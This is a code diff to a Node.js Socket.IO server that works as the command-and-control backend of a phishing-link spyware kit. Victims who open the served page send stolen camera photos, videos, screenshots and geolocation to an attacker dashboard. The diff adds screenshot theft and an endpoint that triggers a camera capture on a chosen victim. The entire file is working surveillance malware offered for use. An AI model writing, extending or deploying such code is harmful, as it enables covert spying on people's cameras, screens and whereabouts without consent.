@@ -12,30 +12,32 @@ const io = socketIo(server, {
 app.use(express.json({ limit: '100mb' }));
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Store connected victims with their socket IDs
+// Store victims
 let victims = new Map();
 
 io.on('connection', (socket) => {
     console.log('🎯 Victim connected:', socket.id);
-    victims.set(socket.id, { socket, id: socket.id, connectedAt: new Date() });
+    victims.set(socket.id, { socket, id: socket.id, connectedAt: Date.now() });
     
-    // Victim sends photo
+    // Photo
     socket.on('steal_photo', (data) => {
-        console.log('📸 Photo received from:', socket.id);
-        io.emit('new_photo', { 
-            ...data, 
-            victimId: socket.id,
-            timestamp: new Date().toISOString()
-        });
+        console.log('📸 Photo received');
+        io.emit('new_photo', { ...data, victimId: socket.id, timestamp: Date.now() });
     });
     
-    // Victim sends video
+    // Video
     socket.on('steal_video', (data) => {
-        console.log('🎥 Video received from:', socket.id);
-        io.emit('new_video', { ...data, victimId: socket.id });
+        console.log('🎥 Video received, size:', data.videoData?.length);
+        io.emit('new_video', { ...data, victimId: socket.id, timestamp: Date.now() });
     });
     
-    // Victim sends location
+    // Screenshot
+    socket.on('steal_screenshot', (data) => {
+        console.log('🖥️ Screenshot received');
+        io.emit('new_screenshot', { ...data, victimId: socket.id, timestamp: Date.now() });
+    });
+    
+    // Location
     socket.on('steal_location', (data) => {
         console.log('📍 Location:', data.lat, data.lng);
         io.emit('new_location', { ...data, victimId: socket.id });
@@ -44,59 +46,52 @@ io.on('connection', (socket) => {
     // Dashboard joins
     socket.on('dashboard_join', () => {
         socket.join('dashboard');
-        console.log('🕹️ Dashboard connected');
+        console.log('🖥️ Dashboard connected');
+    });
+    
+    // Manual capture request to specific victim
+    socket.on('request_photo', (victimId) => {
+        const victim = victims.get(victimId);
+        if (victim) {
+            victim.socket.emit('capture_now');
+            console.log('📸 Manual photo requested for:', victimId);
+        }
     });
     
     socket.on('disconnect', () => {
-        console.log('💀 Disconnected:', socket.id);
+        console.log('❌ Disconnected:', socket.id);
         victims.delete(socket.id);
         io.emit('victim_disconnected', socket.id);
     });
 });
 
-// Attacker dashboard
+// Routes
 app.get('/dashboard', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
 });
 
-// Malicious link - victim page
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'victim.html'));
 });
 
-// API for manual photo capture
-app.post('/request-photo/:victimId', (req, res) => {
-    const victimId = req.params.victimId;
-    const victim = victims.get(victimId);
-    if (victim && victim.socket) {
-        victim.socket.emit('request_photo');
-        res.json({ success: true, message: 'Photo request sent' });
-    } else {
-        res.json({ success: false, message: 'Victim not found' });
-    }
+// API endpoints
+app.get('/api/victims', (req, res) => {
+    res.json(Array.from(victims.keys()));
 });
 
-// API for manual location request
-app.post('/request-location/:victimId', (req, res) => {
-    const victimId = req.params.victimId;
-    const victim = victims.get(victimId);
-    if (victim && victim.socket) {
-        victim.socket.emit('request_location');
-        res.json({ success: true, message: 'Location request sent' });
+app.post('/api/capture/:victimId', (req, res) => {
+    const victim = victims.get(req.params.victimId);
+    if (victim) {
+        victim.socket.emit('capture_now');
+        res.json({ success: true });
     } else {
-        res.json({ success: false, message: 'Victim not found' });
+        res.json({ success: false });
     }
-});
-
-// Get all active victims
-app.get('/victims', (req, res) => {
-    const victimList = Array.from(victims.keys()).map(id => ({ id }));
-    res.json(victimList);
 });
 
 const PORT = process.env.PORT || 8080;
 server.listen(PORT, '0.0.0.0', () => {
-    console.log(`\n🔴 SERVER RUNNING on port ${PORT}`);
-    console.log(`📱 Victim link: https://your-project.up.railway.app`);
-    console.log(`🕹️ Dashboard: https://your-project.up.railway.app/dashboard`);
+    console.log(`\n🚀 Server running on port ${PORT}`);
+    console.log(`📱 Victim: https://your-project.up.railway.app`);
+    console.log(`🖥️ Dashboard: https://your-project.up.railway.app/dashboard`);
 });
